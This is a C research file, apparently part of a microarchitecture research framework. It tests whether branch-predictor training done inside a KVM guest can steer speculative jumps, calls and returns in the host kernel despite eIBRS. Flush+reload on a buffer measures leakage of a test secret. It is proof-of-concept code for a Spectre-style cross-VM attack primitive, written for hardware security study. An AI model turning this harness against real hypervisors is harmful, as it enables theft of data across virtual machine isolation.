// SPDX-License-Identifier: GPL-3.0-only
/*
 * Investigate $BPRC_{G \rightarrow H}$
 */

#include <err.h>
#include <syscall.h>
#include <unistd.h>

// linux kernel selftest magic
#include <ucall_common.h>

#include "uarch-research-fw/kmod_ap/ap_ioctl.h"
#include "uarch-research-fw/kmod_spec_ctrl/spec_ctrl_ioctl.h"
#include "uarch-research-fw/lib/bp_tools.h"
#include "uarch-research-fw/lib/memtools.h"
#include "uarch-research-fw/lib/msr.h"
#include "uarch-research-fw/lib/stats.h"

#define RB_OFFSET 0xcc
#define RB_STRIDE (4096 + 256) // reduce false positives on Gracemont
#include "uarch-research-fw/lib/rb_tools.h"

#define NUM_ROUNDS 1000
#define MAX_ATTEMPTS 8

#define SYS_INVALID 1024
#define PAGE_SIZE 4096

// change how the VMExit is triggered
// #define EXPERIMENT_CONFIG_VMCALL
// #define EXPERIMENT_CONFIG_CPUID

typedef struct registers {
	u64 src_ptr; // code snip that contains the jump instruction
	u64 dst_ptr_ptr; // jump target

	u64 memory_ptr;
	u64 dst_ptr; // jump target
} registers_t;

typedef struct exp_params {
	u64 src;
	u64 src_size;
} exp_params_t;

typedef struct run_params {
	exp_params_t exp_params;
	registers_t train;
	registers_t victim;
} run_params_t;

typedef struct exp_res {
	u64 hits;
	u64 check;
} exp_res_t;

run_params_t run_params;

// clang-format off
extern unsigned char train_src_label_jump[];
mk_snip(train_src_jump,
    BHB_SETUP(194, 0x10 - 2)
    "clflush (%rbx)\n"
    "lfence\n"
    "train_src_label_jump:\n"
    "jmp *(%rbx)\n"
    "int3\n"
);
extern unsigned char train_src_label_call[];
mk_snip(train_src_call,
    BHB_SETUP(194, 0x10 - 2)
    "clflush (%rbx)\n"
    "lfence\n"
    "train_src_label_call:\n"
    "call *(%rbx)\n"
    "ret\n"
    "int3\n"
);
extern unsigned char train_src_label_ret[];
mk_snip(train_src_ret,
    ".rept 16\n"
    "lea 1f(%rip), %r8\n"
    "pushq  %r8       \n"
    "ret\n"
    "1:\n"
    ".endr\n"

    // put in some distance between the underflow and the victim to avoid tainting the BTB
    ".rept 32\n"
    "nop\n"
    ".endr\n"

    "pushq (%rbx)\n"
    BHB_SETUP(194, 0x10 - 2)
    "clflush (%rsp)\n"
    "lfence\n"
    "train_src_label_ret:\n"
    "ret\n"
    "int3\n"
);
// clang-format on

// clang-format off
mk_snip(victim_dst,
    "lfence\n"
    "ret\n"
    "int3       \n"
);
// clang-format on

// clang-format off
mk_snip(train_dst,
    "add $"STR(RB_OFFSET)", %rcx\n"
    "mov (%rcx), %rcx\n"
    // "syscall\n"
	#if defined(EXPERIMENT_CONFIG_VMCALL)
    "vmcall\n"
	#elif defined(EXPERIMENT_CONFIG_CPUID)
	"cpuid\n"
	#endif
    ".rept 32\n"
    "nop\n"
    ".endr\n"
    "ret\n"
    "int3       \n"
);
// clang-format on

static void guest_main(void)
{
	registers_t *train = &run_params.train;
	u64 sys_nr = SYS_INVALID;
	u64 src_ptr = train->src_ptr;
	u64 dst_ptr_ptr = train->dst_ptr_ptr;
	u64 memory_ptr = train->memory_ptr;

	#if defined(EXPERIMENT_CONFIG_VMCALL) || defined(EXPERIMENT_CONFIG_CPUID)
		// run the code once in advance to make sure the page is mapped
		asm volatile(
			"lea 1f(%%rip), %%r11\n"
			"pushq %%r11\n"
			"jmp *%0\n"
			"1:\n"
		: "+r"(*(u64 *)dst_ptr_ptr), "+c"(memory_ptr), "+a"(sys_nr)
		:
		: "r8", "r11", "memory");
	#endif

	for (int a = 0; a < MAX_ATTEMPTS; ++a) {
		registers_t *train = &run_params.train;
		u64 sys_nr = SYS_INVALID;
		u64 src_ptr = train->src_ptr;
		u64 dst_ptr_ptr = train->dst_ptr_ptr;
		u64 memory_ptr = train->memory_ptr;
		// clang-format off
        asm volatile(
            "lea 1f(%%rip), %%r11\n"
            "pushq %%r11\n"
            "jmp *%0\n"
            "1:\n"
            : "+r"(src_ptr), "+b"(dst_ptr_ptr), "+c"(memory_ptr)
			, "+a"(sys_nr)
			:
            : "r8", "r11", "memory");
		// clang-format on

		GUEST_SYNC(a);
	};

	GUEST_DONE();
}

static void run_vcpu(struct kvm_vcpu *vcpu)
{
	struct ucall uc;

	vcpu_run(vcpu);

	switch (get_ucall(vcpu, &uc)) {
	case UCALL_SYNC:
		return;
	case UCALL_DONE:
		return;
	case UCALL_ABORT:
		REPORT_GUEST_ASSERT(uc);
	case UCALL_PRINTF:
		// allow the guest to print debug information
		printf("guest | %s", uc.buffer);
		break;
	default:
		TEST_ASSERT(false, "Unexpected exit: %s",
			    exit_reason_str(vcpu->run->exit_reason));
	}
}

void run_call(registers_t *r)
{
	u64 memory_ptr = r->memory_ptr;
	// clang-format off
    asm volatile(""
        "call *%%rdx\n"
        : "+c"(memory_ptr)
        : "d"(r->src_ptr), "b"(r->dst_ptr_ptr)
        : "r8", "memory", "flags");
	// clang-format on
}

// outside the function to make sure compiler does not optimize it away
struct ap_payload p = { 0 };
void run_exp_once(run_params_t *params, struct kvm_vcpu *vcpu)
{
	u64 sys_nr;

	// params
	registers_t *victim = &params->victim;
	registers_t *train = &params->train;

	rb_reset();

	// isolate the measurements from the setup
	for (volatile int i = 0; i < 100000; ++i)
		;

	for (int attempt = 0; attempt < MAX_ATTEMPTS; ++attempt) {
		// inject the prediction
		run_vcpu(vcpu);

		rb_flush();
		// try to consume the branch prediction in hypervisor kernel
		ap_run(run_call, victim);

		// we need this to reduce false positives on alderlake
		for (volatile int i = 0; i < 10000; ++i)
			;
		rb_reload();
	}
}

void copy_to_guest(struct kvm_vm *vm, code_snip_t *code_snip)
{
	static u64 next_slot = NR_MEM_REGIONS;
	static u64 used_pages = 0;

	u64 guest_num_pages = code_snip->map_sz / PAGE_SIZE;
	u64 guest_test_phys_mem =
		(vm->max_gfn - used_pages - guest_num_pages) * PAGE_SIZE;

	// map guest memory
	vm_userspace_mem_region_add(vm, DEFAULT_VM_MEM_SRC, guest_test_phys_mem,
				    next_slot, guest_num_pages, 0);
	virt_map(vm, _ul(code_snip->map_base), guest_test_phys_mem,
		 guest_num_pages);
	used_pages += guest_num_pages;
	++next_slot;

	// copy the data to the guest
	u64 *addr = addr_gpa2hva(vm, (vm_paddr_t)guest_test_phys_mem);
	memcpy(addr, code_snip->map_base, code_snip->map_sz);
}

const u64 dummy_memory;
int run_exp(exp_params_t *params, exp_res_t *exp_res)
{
	int err = 0;
	int secret = SECRET;

	// prepare VM
	struct kvm_vcpu *vcpu;
	struct kvm_vm *vm;

	vm = vm_create_with_one_vcpu(&vcpu, guest_main);

	// build the set of code snippets in advance
	code_snip_t train_src_snip;
	code_snip_t train_dst_snip;
	code_snip_t victim_dst_snip;

	// create random true victim target
	u64 victim_dst_addr;
	do {
		victim_dst_addr = rand47();
	} while (init_snip(&victim_dst_snip, victim_dst_addr, victim_dst));
	// also map the victim destination into the VM
	copy_to_guest(vm, &victim_dst_snip);

	// create random address for branch to attack
	u64 train_src_addr = rand47();
	if (map_code(&train_src_snip, train_src_addr, _ptr(params->src),
		     params->src_size)) {
		err = 1;
		goto cleanup_victim_gadget;
	}
	// also map the training source into the VM
	copy_to_guest(vm, &train_src_snip);

	u64 train_dst_addr = (train_src_addr & 0x7FFFFF000000ul) |
			     (rand47() & 0xFFFFFFul);
	if (init_snip(&train_dst_snip, train_dst_addr, train_dst)) {
		err = 1;
		goto cleanup_train_src;
	}
	// also map the training destination into the VM
	copy_to_guest(vm, &train_dst_snip);

	run_params.victim.src_ptr = train_src_addr;
	run_params.victim.dst_ptr = victim_dst_addr;
	run_params.victim.dst_ptr_ptr = _ul(&run_params.victim.dst_ptr);
	run_params.victim.memory_ptr = RB_PTR + secret * RB_STRIDE;

	run_params.train.src_ptr = train_src_addr;
	run_params.train.dst_ptr = train_dst_addr;
	run_params.train.dst_ptr_ptr = _ul(&run_params.train.dst_ptr);
	run_params.train.memory_ptr = _ul(&dummy_memory) - RB_OFFSET;

	run_params.exp_params = *params;

	// inform the guest about the current configuration
	sync_global_to_guest(vm, run_params);

	run_exp_once(&run_params, vcpu);

	exp_res->hits = rb_hist[secret];
	exp_res->check = rb_hist[(secret + 1) % RB_SLOTS];

	junmap(&train_dst_snip);
cleanup_train_src:
	junmap(&train_src_snip);
cleanup_victim_gadget:
	junmap(&victim_dst_snip);

	kvm_vm_free(vm);
	return err;
}

u64 results[NUM_ROUNDS] = { 0 };
void evaluate_experiment(exp_params_t *params, char *label_prefix)
{
	INFO("running %s\n", label_prefix);
	u64 check = 0; // count false positives
	for (int r = 0; r < NUM_ROUNDS; ++r) {
		exp_res_t exp_res;

		if (run_exp(params, &exp_res)) {
			// retry if there was an issue (i.e. addr generation)
			--r;
			continue;
		}

		results[r] = exp_res.hits;
		check += exp_res.check;
	}

	// print statistics
	stats_results_start();
	printf("%s", label_prefix);
	stats_print_u64("hits_per_round_median",
			stats_median_u64(results, NUM_ROUNDS));
	printf("%s", label_prefix);
	stats_print_f64("hits_per_round_avg",
			stats_avg_u64(results, NUM_ROUNDS));
	printf("%s", label_prefix);
	stats_print_u64("hits_per_round_count_gt0",
			stats_count_u64(results, NUM_ROUNDS, &stats_pred_gt0));
	printf("%s", label_prefix);
	stats_print_u64("hits_per_round_sum",
			stats_sum_u64(results, NUM_ROUNDS));
	printf("%s", label_prefix);
	stats_print_u64("check", check);
	stats_results_end();
	fflush(stdout);
}

int main(int argc, char *argv[])
{
    if (argc < 2)
    {
        err(1, "Usage %s <core_id> ", argv[0]);
    }

	srandom(getpid());

	rb_init();
	ap_init();
	spec_ctrl_init();

	INFO("finding leaks\n");

	int core_id;
    sscanf(argv[1], "%d", &core_id);

    // Intel make sure eIBRS is enabled and nothing else
	spec_ctrl_set(core_id, IBRS_MASK);

	// run the experiment for all types of instructions

	exp_params_t params_jump = {
		.src = _ul(train_src_jump__snip),
		.src_size = snip_sz(train_src_jump),
	};
	evaluate_experiment(&params_jump, "jmp_");

	exp_params_t params_call = {
		.src = _ul(train_src_call__snip),
		.src_size = snip_sz(train_src_call),
	};
	evaluate_experiment(&params_call, "call_");

	exp_params_t params_ret = {
		.src = _ul(train_src_ret__snip),
		.src_size = snip_sz(train_src_ret),
	};
	evaluate_experiment(&params_ret, "ret_");
}